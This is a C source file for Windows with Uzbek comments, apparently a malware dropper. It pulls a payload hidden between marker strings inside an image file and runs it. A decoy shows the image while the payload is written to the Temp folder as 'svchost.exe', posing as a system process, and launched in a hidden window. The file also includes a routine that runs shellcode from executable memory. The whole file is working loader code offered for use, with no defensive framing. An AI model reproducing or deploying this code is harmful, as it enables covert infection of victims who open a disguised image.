/*
 * Image Loader - Rasm ichidan payload chiqarish va ishga tushirish
 * Bu kod rasmga biriktiriladi va rasm ochilganda payload ishga tushadi
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define MAGIC_START "===PAYLOAD_START==="
#define MAGIC_END "===PAYLOAD_END==="
#define TEMP_EXE "C:\\Windows\\Temp\\svchost.exe"

// Rasmni ko'rsatish (Windows API)
void display_image(const char *image_path) {
    ShellExecuteA(NULL, "open", image_path, NULL, NULL, SW_SHOW);
}

// Payload'ni xotiradan ishga tushirish (in-memory execution)
void execute_payload_in_memory(unsigned char *payload, size_t size) {
    // VirtualAlloc orqali xotira ajratish
    void *exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (exec_mem == NULL) {
        return;
    }

    // Payload'ni xotiraga ko'chirish
    memcpy(exec_mem, payload, size);

    // Payload'ni ishga tushirish
    ((void(*)())exec_mem)();

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

// Fayldan payload chiqarish
unsigned char* extract_payload(const char *file_path, size_t *payload_size) {
    FILE *fp = fopen(file_path, "rb");
    if (!fp) return NULL;

    // Fayl hajmini aniqlash
    fseek(fp, 0, SEEK_END);
    size_t file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    // Faylni o'qish
    unsigned char *data = (unsigned char*)malloc(file_size);
    fread(data, 1, file_size, fp);
    fclose(fp);

    // Payload boshlanishini topish
    unsigned char *payload_start = NULL;
    for (size_t i = 0; i < file_size - strlen(MAGIC_START); i++) {
        if (memcmp(data + i, MAGIC_START, strlen(MAGIC_START)) == 0) {
            payload_start = data + i + strlen(MAGIC_START);
            break;
        }
    }

    if (!payload_start) {
        free(data);
        return NULL;
    }

    // Payload oxirini topish
    unsigned char *payload_end = NULL;
    for (size_t i = (payload_start - data); i < file_size - strlen(MAGIC_END); i++) {
        if (memcmp(data + i, MAGIC_END, strlen(MAGIC_END)) == 0) {
            payload_end = data + i;
            break;
        }
    }

    if (!payload_end) {
        free(data);
        return NULL;
    }

    // Payload hajmi
    *payload_size = payload_end - payload_start;

    // Payload'ni ajratib olish
    unsigned char *payload = (unsigned char*)malloc(*payload_size);
    memcpy(payload, payload_start, *payload_size);

    free(data);
    return payload;
}

// Payload'ni faylga yozish va ishga tushirish
void execute_payload_from_file(const char *image_path) {
    size_t payload_size;
    unsigned char *payload = extract_payload(image_path, &payload_size);

    if (!payload) {
        return;
    }

    // Vaqtinchalik faylga yozish
    FILE *fp = fopen(TEMP_EXE, "wb");
    if (fp) {
        fwrite(payload, 1, payload_size, fp);
        fclose(fp);

        // Background'da ishga tushirish
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessA(NULL, TEMP_EXE, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(payload);
}

// Entry point - GUI versiya (rasm ochilganda)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    // 1. Rasmni ko'rsatish
    display_image(exe_path);

    // 2. Background'da payload ishga tushirish
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execute_payload_from_file, 
                 exe_path, 0, NULL);

    return 0;
}

// Entry point - Console versiya
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <image_with_payload.png>\n", argv[0]);
        return 1;
    }

    const char *image_path = argv[1];

    printf("[*] Extracting payload from: %s\n", image_path);

    size_t payload_size;
    unsigned char *payload = extract_payload(image_path, &payload_size);

    if (payload) {
        printf("[+] Payload found: %zu bytes\n", payload_size);
        printf("[*] Executing payload...\n");

        // Payload'ni ishga tushirish
        execute_payload_from_file(image_path);

        free(payload);
        printf("[+] Done!\n");
    } else {
        printf("[-] No payload found in image\n");
    }

    return 0;
}
